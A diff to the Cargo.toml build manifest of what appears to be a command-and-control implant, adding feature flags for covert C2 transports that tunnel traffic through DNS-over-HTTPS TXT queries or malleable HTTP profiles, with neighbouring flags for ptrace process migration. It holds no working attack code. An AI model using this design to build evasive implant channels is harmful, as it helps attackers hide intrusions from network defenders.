@@ -97,6 +97,16 @@ memory-guard = []
 # Linux ptrace-based process migration. Off by default — implementation is
 # complete but disabled to require explicit operator opt-in.
 linux-ptrace-migrate = []
+# Activate the DNS-over-HTTPS covert transport (c2_doh::DohTransport).
+# When enabled and dns_over_https=true is set in agent.toml, the agent
+# tunnels C2 traffic through DNS TXT queries sent to a DoH resolver.
+# NOTE: There is no server-side DoH listener in this release; you must
+# deploy a compatible DNS-to-C2 bridge on the server side.
+doh-transport = []
+# Activate the HTTP malleable-profile transport (c2_http::HttpTransport).
+# When enabled and cdn_relay=true is set in agent.toml, the agent tunnels
+# C2 traffic over HTTP/S using the malleable profile headers/URIs.
+http-transport = []
 
 [[bin]]
 name = "agent-standalone"
